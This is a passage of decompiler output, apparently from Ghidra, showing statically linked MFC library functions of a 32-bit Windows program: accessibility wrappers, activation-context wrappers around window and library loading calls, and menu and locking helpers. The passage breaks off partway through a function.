CWnd::get_accName(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                 undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x28))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accValue(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accValue(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                  undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x2c))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accDescription(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accDescription
          (CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x30))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accRole(struct tagVARIANT,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accRole(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                 undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x34))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accState(struct tagVARIANT,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accState(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                  undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x38))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accHelp(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accHelp(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                 undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x3c))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accHelpTopic(wchar_t * *,struct tagVARIANT,long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall
CWnd::get_accHelpTopic
          (CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5,undefined4 param_6)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x40))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5,param_6);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accKeyboardShortcut(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accKeyboardShortcut
          (CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x44))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



void __thiscall FUN_0040e816(void *this,undefined4 param_1)

{
  (**(code **)(**(int **)((int)this + 0x28) + 0x48))(*(int **)((int)this + 0x28),param_1);
  return;
}



void __thiscall FUN_0040e82b(void *this,undefined4 param_1)

{
  (**(code **)(**(int **)((int)this + 0x28) + 0x4c))(*(int **)((int)this + 0x28),param_1);
  return;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::get_accDefaultAction(struct tagVARIANT,wchar_t * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

long __thiscall
CWnd::get_accDefaultAction
          (CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x50))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::accSelect(long,struct tagVARIANT)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall
CWnd::accSelect(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
               undefined4 param_4,undefined4 param_5)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x54))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::accLocation(long *,long *,long *,long *,struct tagVARIANT)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release,
// Visual Studio 2012 Release

long __thiscall
CWnd::accLocation(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                 undefined4 param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7,
                 undefined4 param_8)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x58))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5,param_6,param_7,
                     param_8);
  return lVar1;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::accNavigate(long,struct tagVARIANT,struct tagVARIANT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall
CWnd::accNavigate(CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,
                 undefined4 param_4,undefined4 param_5,undefined4 param_6)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 0x5c))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4,param_5,param_6);
  return lVar1;
}



void __thiscall FUN_0040e8e0(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  (**(code **)(**(int **)((int)this + 0x28) + 0x60))
            (*(int **)((int)this + 0x28),param_1,param_2,param_3);
  return;
}



// Library Function - Single Match
//  public: virtual long __thiscall CWnd::accDoDefaultAction(struct tagVARIANT)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

long __thiscall
CWnd::accDoDefaultAction
          (CWnd *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  long lVar1;
  
  lVar1 = (**(code **)(**(int **)(this + 0x28) + 100))
                    (*(int **)(this + 0x28),param_1,param_2,param_3,param_4);
  return lVar1;
}



void __thiscall
FUN_0040e91d(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  (**(code **)(**(int **)((int)this + 0x28) + 0x68))
            (*(int **)((int)this + 0x28),param_1,param_2,param_3,param_4,param_5);
  return;
}



undefined4 __thiscall FUN_0040e942(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 0x2c) = param_1;
  return 0;
}



uint __fastcall FUN_0040e953(int param_1)

{
  return *(uint *)(param_1 + 0x3c) & 0x10;
}



undefined4 FUN_0040e95a(undefined4 *param_1)

{
  if (param_1 == (undefined4 *)0x0) {
    AfxThrowNotSupportedException();
  }
  *param_1 = 0;
  return 1;
}



undefined4 FUN_0040e975(undefined4 param_1,undefined4 *param_2)

{
  if (param_2 == (undefined4 *)0x0) {
    AfxThrowNotSupportedException();
  }
  *param_2 = 0;
  return 1;
}



undefined ** FUN_0040e990(void)

{
  return &PTR_DAT_00429ad8;
}



// Library Function - Single Match
//  public: long __stdcall CMFCComObject<class ATL::CAccessibleProxy>::QueryInterface<struct
// IAccessibleProxy>(struct IAccessibleProxy * *)
// 
// Library: Visual Studio 2008 Release

long CMFCComObject<class_ATL::CAccessibleProxy>::QueryInterface<struct_IAccessibleProxy>
               (IAccessibleProxy **param_1)

{
  long lVar1;
  
  lVar1 = (**(code **)*param_1)(param_1,&DAT_00429f74);
  return lVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  unsigned short __cdecl AfxCtxRegisterClassA(struct tagWNDCLASSA const *)
//  unsigned short __cdecl AfxCtxRegisterClassW(struct tagWNDCLASSW const *)
// 
// Library: Visual Studio 2008 Release

uint __cdecl FID_conflict_AfxCtxRegisterClassA(WNDCLASSW *param_1)

{
  ATOM AVar1;
  AFX_MODULE_STATE *pAVar2;
  eActCtxResult eVar3;
  uint uVar4;
  undefined2 extraout_var;
  ulong *puVar5;
  ulong local_24;
  uint local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fb30;
  uStack_c = 0x40e9bb;
  local_24 = 0;
  puVar5 = &local_24;
  pAVar2 = AfxGetModuleState();
  eVar3 = AfxActivateActCtxWrapper(*(void **)(pAVar2 + 0x80),puVar5);
  local_20 = 0;
  if (eVar3 == 0) {
    uVar4 = 0;
  }
  else {
    local_8 = (undefined *)0x0;
    AVar1 = RegisterClassW(param_1);
    local_20 = (uint)AVar1;
    local_8 = (undefined *)0xfffffffe;
    FUN_0040ea0a();
    uVar4 = CONCAT22(extraout_var,(undefined2)local_20);
  }
  return uVar4;
}



void FUN_0040ea0a(void)

{
  DWORD dwErrCode;
  int unaff_EBP;
  bool bVar1;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    bVar1 = *(short *)(unaff_EBP + -0x1c) != 0;
    if (bVar1) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (!bVar1) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  int __cdecl AfxCtxGetClassInfoA(struct HINSTANCE__ *,char const *,struct tagWNDCLASSA *)
//  int __cdecl AfxCtxGetClassInfoW(struct HINSTANCE__ *,wchar_t const *,struct tagWNDCLASSW *)
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl FID_conflict_AfxCtxGetClassInfoW(HINSTANCE param_1,LPCWSTR param_2,LPWNDCLASSW param_3)

{
  AFX_MODULE_STATE *pAVar1;
  eActCtxResult eVar2;
  ulong *puVar3;
  ulong local_24;
  BOOL local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fb50;
  uStack_c = 0x40ea4d;
  local_24 = 0;
  puVar3 = &local_24;
  pAVar1 = AfxGetModuleState();
  eVar2 = AfxActivateActCtxWrapper(*(void **)(pAVar1 + 0x80),puVar3);
  local_20 = 0;
  if (eVar2 == 0) {
    local_20 = 0;
  }
  else {
    local_8 = (undefined *)0x0;
    local_20 = GetClassInfoW(param_1,param_2,param_3);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040eaa0();
  }
  return local_20;
}



void FUN_0040eaa0(void)

{
  uint uVar1;
  DWORD dwErrCode;
  uint unaff_EBX;
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    uVar1 = (uint)(*(uint *)(unaff_EBP + -0x1c) == unaff_EBX);
    if (uVar1 == unaff_EBX) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (uVar1 != unaff_EBX) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  int __cdecl AfxCtxGetClassInfoA(struct HINSTANCE__ *,char const *,struct tagWNDCLASSA *)
//  int __cdecl AfxCtxGetClassInfoExA(struct HINSTANCE__ *,char const *,struct tagWNDCLASSEXA *)
//  int __cdecl AfxCtxGetClassInfoExW(struct HINSTANCE__ *,wchar_t const *,struct tagWNDCLASSEXW *)
//  int __cdecl AfxCtxGetClassInfoW(struct HINSTANCE__ *,wchar_t const *,struct tagWNDCLASSW *)
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl
FID_conflict_AfxCtxGetClassInfoExW(HINSTANCE param_1,LPCWSTR param_2,LPWNDCLASSEXW param_3)

{
  AFX_MODULE_STATE *pAVar1;
  eActCtxResult eVar2;
  ulong *puVar3;
  ulong local_24;
  BOOL local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fb70;
  uStack_c = 0x40eae1;
  local_24 = 0;
  puVar3 = &local_24;
  pAVar1 = AfxGetModuleState();
  eVar2 = AfxActivateActCtxWrapper(*(void **)(pAVar1 + 0x80),puVar3);
  local_20 = 0;
  if (eVar2 == 0) {
    local_20 = 0;
  }
  else {
    local_8 = (undefined *)0x0;
    local_20 = GetClassInfoExW(param_1,param_2,param_3);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040eb34();
  }
  return local_20;
}



void FUN_0040eb34(void)

{
  uint uVar1;
  DWORD dwErrCode;
  uint unaff_EBX;
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    uVar1 = (uint)(*(uint *)(unaff_EBP + -0x1c) == unaff_EBX);
    if (uVar1 == unaff_EBX) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (uVar1 != unaff_EBX) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  struct HWND__ * __cdecl AfxCtxCreateWindowExA(unsigned long,char const *,char const *,unsigned
// long,int,int,int,int,struct HWND__ *,struct HMENU__ *,struct HINSTANCE__ *,void *)
//  struct HWND__ * __cdecl AfxCtxCreateWindowExW(unsigned long,wchar_t const *,wchar_t const
// *,unsigned long,int,int,int,int,struct HWND__ *,struct HMENU__ *,struct HINSTANCE__ *,void *)
// 
// Library: Visual Studio 2008 Release

HWND __cdecl
FID_conflict_AfxCtxCreateWindowExW
          (DWORD param_1,LPCWSTR param_2,LPCWSTR param_3,DWORD param_4,int param_5,int param_6,
          int param_7,int param_8,HWND param_9,HMENU param_10,HINSTANCE param_11,LPVOID param_12)

{
  AFX_MODULE_STATE *pAVar1;
  eActCtxResult eVar2;
  ulong *puVar3;
  ulong local_24;
  HWND local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fb90;
  uStack_c = 0x40eb75;
  local_24 = 0;
  puVar3 = &local_24;
  pAVar1 = AfxGetModuleState();
  eVar2 = AfxActivateActCtxWrapper(*(void **)(pAVar1 + 0x80),puVar3);
  local_20 = (HWND)0x0;
  if (eVar2 == 0) {
    local_20 = (HWND)0x0;
  }
  else {
    local_8 = (undefined *)0x0;
    local_20 = CreateWindowExW(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
                               param_9,param_10,param_11,param_12);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040ebe3();
  }
  return local_20;
}



void FUN_0040ebe3(void)

{
  uint uVar1;
  DWORD dwErrCode;
  uint unaff_EBX;
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    uVar1 = (uint)(*(uint *)(unaff_EBP + -0x1c) == unaff_EBX);
    if (uVar1 == unaff_EBX) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (uVar1 != unaff_EBX) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  struct HINSTANCE__ * __cdecl AfxCtxLoadLibraryA(char const *)
// 
// Library: Visual Studio 2008 Release

HINSTANCE__ * __cdecl AfxCtxLoadLibraryA(char *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  eActCtxResult eVar2;
  ulong *puVar3;
  ulong local_24;
  HMODULE local_20;
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_0042fbb0;
  uStack_c = 0x40ec24;
  local_24 = 0;
  puVar3 = &local_24;
  pAVar1 = AfxGetModuleState();
  eVar2 = AfxActivateActCtxWrapper(*(void **)(pAVar1 + 0x80),puVar3);
  local_20 = (HMODULE)0x0;
  if (eVar2 == 0) {
    local_20 = (HINSTANCE__ *)0x0;
  }
  else {
    local_8 = (undefined *)0x0;
    local_20 = LoadLibraryA(param_1);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040ec71();
  }
  return local_20;
}



void FUN_0040ec71(void)

{
  uint uVar1;
  DWORD dwErrCode;
  uint unaff_EBX;
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x24) != 2) {
    uVar1 = (uint)(*(uint *)(unaff_EBP + -0x1c) == unaff_EBX);
    if (uVar1 == unaff_EBX) {
      dwErrCode = 0;
    }
    else {
      dwErrCode = GetLastError();
    }
    FUN_0040ad54();
    if (uVar1 != unaff_EBX) {
      SetLastError(dwErrCode);
    }
  }
  return;
}



// Library Function - Single Match
//  public: unsigned int __thiscall CMenu::GetMenuItemID(int)const 
// 
// Library: Visual Studio 2008 Release

uint __thiscall CMenu::GetMenuItemID(CMenu *this,int param_1)

{
  UINT UVar1;
  
  UVar1 = ::GetMenuItemID(*(HMENU *)(this + 4),param_1);
  return UVar1;
}



// Library Function - Single Match
//  public: class CMenu * __thiscall CMenu::GetSubMenu(int)const 
// 
// Library: Visual Studio 2008 Release

CMenu * __thiscall CMenu::GetSubMenu(CMenu *this,int param_1)

{
  HMENU pHVar1;
  CMenu *pCVar2;
  
  pHVar1 = ::GetSubMenu(*(HMENU *)(this + 4),param_1);
  pCVar2 = FromHandle(pHVar1);
  return pCVar2;
}



void __thiscall FUN_0040ecd6(void *this,LPRECT param_1)

{
  GetWindowRect(*(HWND *)((int)this + 0x20),param_1);
  return;
}



void __fastcall FUN_0040eceb(int param_1)

{
  EnableWindow(*(HWND *)(param_1 + 0x20),0);
  return;
}



void __fastcall FUN_0040ecf7(int param_1)

{
  EnableWindow(*(HWND *)(param_1 + 0x20),1);
  return;
}



// Library Function - Single Match
//  public: __thiscall CWaitCursor::CWaitCursor(void)
// 
// Library: Visual Studio 2008 Release

CWaitCursor * __thiscall CWaitCursor::CWaitCursor(CWaitCursor *this)

{
  AfxGetModuleState();
  FUN_0040d54c();
  return this;
}



// Library Function - Single Match
//  public: void __thiscall CInternalGlobalLock::Lock(int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CInternalGlobalLock::Lock(CInternalGlobalLock *this,int param_1)

{
  int iVar1;
  int iVar2;
  int *extraout_ECX;
  int unaff_ESI;
  
  iVar2 = 0x7fffffff;
  iVar1 = unaff_ESI;
  if (param_1 == 0x7fffffff) goto LAB_0040ed3c;
  if (*(int *)this == 0x7fffffff) goto LAB_0040ed3a;
  if (*(int *)this == param_1) goto LAB_0040ed3a;
  do {
    AfxThrowNotSupportedException();
    this = (CInternalGlobalLock *)extraout_ECX;
LAB_0040ed3a:
    *(int *)this = param_1;
    iVar1 = unaff_ESI;
LAB_0040ed3c:
    param_1 = iVar1;
    unaff_ESI = param_1;
  } while (*(int *)this == iVar2);
  AfxLockGlobals(*(int *)this);
  return;
}



// Library Function - Single Match
//  public: void __thiscall CInternalGlobalLock::Unlock(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CInternalGlobalLock::Unlock(CInternalGlobalLock *this)

{
  if (*(int *)this != 0x7fffffff) {
    AfxUnlockGlobals(*(int *)this);
    *(undefined4 *)this = 0x7fffffff;
  }
  return;
}



// Library Function - Single Match
//  public: void __thiscall CHandleMap::SetPermanent(void *,class CObject *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CHandleMap::SetPermanent(CHandleMap *this,void *param_1,CObject *param_2)

{
  CObject **ppCVar1;
  
  ppCVar1 = (CObject **)CMapPtrToPtr::operator[]((CMapPtrToPtr *)(this + 0x1c),param_1);
  *ppCVar1 = param_2;
  return;
}



// Library Function - Single Match
//  public: __thiscall CWnd::CWnd(void)
// 
// Library: Visual Studio 2008 Release

CWnd * __thiscall CWnd::CWnd(CWnd *this)

{
  CCmdTarget::CCmdTarget((CCmdTarget *)this);
  *(undefined ***)this = vftable;
  *(undefined ***)(this + 0x30) = XAccessible::vftable;
  *(undefined ***)(this + 0x34) = XAccessibleServer::vftable;
  *(undefined4 *)(this + 0x20) = 0;
  this[0x24] = (CWnd)0x0;
  *(undefined4 *)(this + 0x2c) = 0;
  *(undefined4 *)(this + 0x28) = 0;
  *(undefined4 *)(this + 0x38) = 0;
  *(undefined4 *)(this + 0x3c) = 0;
  *(undefined4 *)(this + 0x40) = 0;
  *(undefined4 *)(this + 0x44) = 0;
  *(undefined4 *)(this + 0x48) = 0;
  *(undefined4 *)(this + 0x4c) = 0;
  *(undefined4 *)(this + 0x50) = 0;
  return this;
}



void FUN_0040edc7(CWnd *param_1,LPRECT param_2,ulong *param_3)

{
  ulong uVar1;
  
  FUN_0040ecd6(param_1,param_2);
  uVar1 = CWnd::GetExStyle(param_1);
  *param_3 = uVar1;
  return;
}



void __thiscall FUN_0040ede8(void *this,HMENU param_1)

{
  if (param_1 != (HMENU)0x0) {
    param_1 = (HMENU)param_1[1].unused;
  }
  SetMenu(*(HWND *)((int)this + 0x20),param_1);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual int __thiscall CWnd::CreateEx(unsigned long,char const *,char const *,unsigned
// long,struct tagRECT const &,class CWnd *,unsigned int,void *)
//  public: virtual int __thiscall CWnd::CreateEx(unsigned long,wchar_t const *,wchar_t const
// *,unsigned long,struct tagRECT const &,class CWnd *,unsigned int,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall
CreateEx(void *this,undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
        int *param_5,int param_6,undefined4 param_7,undefined4 param_8)

{
  undefined4 uVar1;
  
  if (param_6 == 0) {
    uVar1 = 0;
  }
  else {
    uVar1 = *(undefined4 *)(param_6 + 0x20);
  }
                    // WARNING: Load size is inaccurate
  (**(code **)(*this + 0x5c))
            (param_1,param_2,param_3,param_4,*param_5,param_5[1],param_5[2] - *param_5,
             param_5[3] - param_5[1],uVar1,param_7,param_8);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual int __thiscall CWnd::Create(char const *,char const *,unsigned long,struct
// tagRECT const &,class CWnd *,unsigned int,struct CCreateContext *)
//  public: virtual int __thiscall CWnd::Create(wchar_t const *,wchar_t const *,unsigned long,struct
// tagRECT const &,class CWnd *,unsigned int,struct CCreateContext *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall
Create(void *this,undefined4 param_1,undefined4 param_2,uint param_3,int *param_4,int param_5,
      undefined4 param_6,undefined4 param_7)

{
  undefined4 uVar1;
  
  if (param_5 == 0) {
    uVar1 = 0;
  }
  else {
    uVar1 = *(undefined4 *)(param_5 + 0x20);
  }
                    // WARNING: Load size is inaccurate
  (**(code **)(*this + 0x5c))
            (0,param_1,param_2,param_3 | 0x40000000,*param_4,param_4[1],param_4[2] - *param_4,
             param_4[3] - param_4[1],uVar1,param_6,param_7);
  return;
}



// Library Function - Single Match
//  public: static void __stdcall CWnd::CancelToolTips(int)
// 
// Library: Visual Studio 2008 Release

void CWnd::CancelToolTips(int param_1)

{
  HWND hWnd;
  int *piVar1;
  SHORT SVar2;
  AFX_MODULE_THREAD_STATE *pAVar3;
  
  pAVar3 = AfxGetModuleThreadState();
  if ((*(int *)(pAVar3 + 0x3c) != 0) &&
     (hWnd = *(HWND *)(*(int *)(pAVar3 + 0x3c) + 0x20), hWnd != (HWND)0x0)) {
    SendMessageW(hWnd,0x401,0,0);
  }
  piVar1 = *(int **)(pAVar3 + 0x50);
  if ((param_1 != 0) && (piVar1 != (int *)0x0)) {
    SVar2 = GetKeyState(1);
    if (-1 < SVar2) {
      (**(code **)(*piVar1 + 0x178))(0xffffffff);
    }
  }
  return;
}



// Library Function - Single Match
//  class CMenu * __stdcall _AfxFindPopupMenuFromID(class CMenu *,unsigned int)
// 
// Library: Visual Studio 2008 Release

CMenu * _AfxFindPopupMenuFromID(CMenu *param_1,uint param_2)

{
  int iVar1;
  CMenu *pCVar2;
  uint uVar3;
  int iVar4;
  
  if (param_1 == (CMenu *)0x0) {
    AfxThrowNotSupportedException();
  }
  iVar1 = GetMenuItemCount(*(HMENU *)(param_1 + 4));
  iVar4 = 0;
  if (0 < iVar1) {
    do {
      pCVar2 = CMenu::GetSubMenu(param_1,iVar4);
      if (pCVar2 == (CMenu *)0x0) {
        uVar3 = CMenu::GetMenuItemID(param_1,iVar4);
        if (uVar3 == param_2) goto LAB_0040ef58;
      }
      else {
        if (*(uint *)(pCVar2 + 4) == param_2) {
LAB_0040ef58:
          pCVar2 = CMenu::FromHandlePermanent(*(HMENU__ **)(param_1 + 4));
          return pCVar2;
        }
        pCVar2 = _AfxFindPopupMenuFromID(pCVar2,param_2);
        if (pCVar2 != (CMenu *)0x0) {
          return pCVar2;
        }
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < iVar1);
  }
  return (CMenu *)0x0;
}



// Library Function - Single Match
//  public: virtual void __thiscall CWnd::WinHelpInternal(unsigned long,unsigned int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::WinHelpInternal(CWnd *this,ulong param_1,uint param_2)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  if (*(int *)(*(int *)(pAVar1 + 4) + 0x6c) == 1) {
    if (param_2 == 1) {
      param_2 = 0xf;
    }
    else if (param_2 == 3) {
      param_2 = 1;
    }
    else if (param_2 == 0xb) {
      param_2 = 0;
    }
    (**(code **)(*(int *)this + 0x80))(param_1,param_2);
  }
  else {
    (**(code **)(*(int *)this + 0x7c))(param_1,param_2);
  }
  return;
}



// Library Function - Single Match
//  protected: long __thiscall CWnd::OnActivateTopLevel(unsigned int,long)
// 
// Library: Visual Studio 2008 Release

long __thiscall CWnd::OnActivateTopLevel(CWnd *this,uint param_1,long param_2)

{
  AFX_MODULE_THREAD_STATE *pAVar1;
  
  if ((short)param_1 == 0) {
    pAVar1 = AfxGetModuleThreadState();
    if ((*(int *)(pAVar1 + 0x48) != 0) &&
       ((*(uint *)(*(int *)(pAVar1 + 0x48) + 4) & 0x40000000) == 0)) {
      CancelToolTips(1);
    }
  }
  return 0;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual unsigned long __stdcall CWnd::XAccessible::AddRef(void)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

ulong CWnd::XAccessible::AddRef(void)

{
  ulong uVar1;
  int in_stack_00000004;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40eff2;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2
            (local_18,*(AFX_MODULE_STATE **)(in_stack_00000004 + -0x14));
  local_8 = 0;
  uVar1 = CCmdTarget::ExternalAddRef((CCmdTarget *)(in_stack_00000004 + -0x30));
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return uVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

LONG FUN_0040f02e(int param_1)

{
  LONG LVar1;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f03a;
  AFX_MAINTAIN_STATE2::AFX_MAINTAIN_STATE2(local_18,*(AFX_MODULE_STATE **)(param_1 + -0x14));
  local_8 = 0;
  LVar1 = FUN_0040c77d((int *)(param_1 + -0x30));
  local_8 = 0xffffffff;
  if (local_14 != 0) {
    FUN_0040ad54();
  }
  return LVar1;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: virtual long __stdcall CWnd::XAccessible::QueryInterface(struct _GUID const &,void * *)
// 
// Library: Visual Studio 2008 Release

long CWnd::XAccessible::QueryInterface(_GUID *param_1,void **param_2)

{
  ulong uVar1;
  void **in_stack_0000000c;
  AFX_MAINTAIN_STATE2 local_18 [4];
  int local_14;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 8;
  local_8 = 0x40f082;
